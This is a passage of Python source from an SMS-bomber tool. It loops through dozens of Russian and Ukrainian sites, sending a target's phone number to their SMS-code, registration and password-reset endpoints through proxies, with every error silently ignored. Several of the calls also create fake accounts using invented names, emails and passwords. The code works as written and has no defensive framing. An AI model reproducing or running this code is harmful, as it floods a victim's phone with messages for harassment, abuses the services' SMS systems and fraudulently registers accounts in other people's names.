				"get-new-password": "Получите пароль по SMS","user_agreement": "on",
				"personal_data_agreement": "on","formType": "simple","utc_offset": "120"}, 
				proxies=proxies, timeout=10)
		except:
			pass

		# new ones
		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('http://www.aramba.ru/core.php', data={'act': 'codeRequest',
				'phone': '+' + phone, 'l': name, 'p': name, 'name': name, 
				'email': email}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get('https://online.denga.ru/admin/api/json/registration', 
				data={'phone': phone, 'email': email, 'password': password, 
				'passwordConfirmation': password}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://online-api.dozarplati.com/rpc', 
				json={'id': random.randint(1, 5), 'jsonrpc': '2.0', 'method': 'auth.login', 'params': 
				{'phoneNumber': phone}}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://drugvokrug.ru/siteActions/processSms.htm', 
				data={'cell': phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			session.post('https://fastmoney.ru/auth/registration', 
				data={'RegistrationForm[username]': '+' + phone,
				'RegistrationForm[surname]': surname,
				'RegistrationForm[patronymic]' : patronymic,
				'RegistrationForm[password]': password}, proxies=proxies, timeout=10)

		except:
			pass

		try:
			phone = '{}) {}-{}-{}.'.format(phone[1:4], phone[4:7], phone[7:9], phone[9:11])
			requests.post('https://gorzdrav.org/login/sms/send', data={'phone': phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', 
				json={'data': {'firstName': name, 'lastName': surname,'phone': phone, 
				'email': email, 'password': password,'passwordConfirm': password}}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			phone = '{}) {}-{}-{}.'.format(phone[1:4], phone[4:7], phone[7:9], phone[9:11])

			requests.get('https://www.maxidom.ru/ajax/doRegister.php',
			params={'send_code_again': 'Y', 'phone': phone,
				'email': email, 'code_type': 'phone'}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://mistercat.com.ua/index.php', params={'option': 
				'com_ksenmart', 'view': 'profile', 'task': 'profile.sms_auth',
				'tmpl': 'ksenmart'},
			data={'phone': phone, 'type': 'send'}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			phone = '{}-{}'.format(phone[1:4], phone[4:-1])
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
			params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': phone}, 
			proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
			'client': {'firstName': name, 'lastName': surname, 'phone': phone,
			'typeKeys': ['Unemployed']}},
			'query': 'mutation registration($client: ClientInput!) {'
			'\n  registration(client: $client) {'
			'\n    token\n    __typename\n  }\n}\n'}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://online.optima.taxi/user/get-code', data={'phone': phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			phone = '{} ({}){}-{}-{}'.format(phone[0], phone[1:4], phone[4:7], phone[7:9], phone[9:11])

			requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp',
			params={'type': 'sendConfirmCode', 'phoneNumber': phone} , proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp',
			 params={'phone': phone[1:], 'country_code': '+' + phone} , proxies=proxies, timeout=10)
		except:
			pass

		try:
			phone = '{} ({}){}-{}-{}'.format(phone[0], phone[1:4], phone[4:7], phone[7:9], phone[9:11])

			requests.post('https://api-user.privetmir.ru/api/send-code',
			data={'approve1': 'on', 'approve2': 'on', 'checkApproves': 'Y', 'checkExist': 'Y',
			'login': phone, 'scope': 'register-user'}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get('https://api.pswallet.ru/system/smsCode',
			params={'mobile': phone, 'type': '0'}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': phone} ,
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',
			params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7',
			'mobilePhone.areaCode': phone[1:4], 'mobilePhone.localNumber': phone[4:-1]}, 
			proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
			data={'name': name, 'phone': phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('http://taxiseven.ru/auth/register', data={'phone': phone}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			phone = '{} ({}) {}-{}-{}'.format(phone[0], phone[1:4], phone[4:7], phone[7:9], phone[9:11])
			self.session.post('https://totopizza.ru/gus-crystal/',
			data={'PHONE': phone, 'AUTH_FORM': 'Y', 'LOGIN': 'Продолжить'}, verify=False, 
			proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',
			data={'region': 'eu', 'account_name': latin_name, 'language_code': 'en',
			'account_email': email, 'account_password': password}, 
			proxies=proxies, timeout=10)

			requests.post('https://api-ru-manage.voximplant.com/api/SendActivationCode',
			data={'phone': phone, 'account_email': email}, 
			proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},
			headers={'App-ID': 'cabinet'}, proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={'phone': phone}, 
				proxies=proxies, timeout=10)
		except:
			pass

		try:
			requests.post('http://youdrive.today/signup/phone',
			data={'phone': phone, 'phone_code': '7'}, proxies=proxies, timeout=10)
		except:
			pass

	except:
		pass

	global count
	count+=1
	print('\033[91m' + '[Цикл пройден]')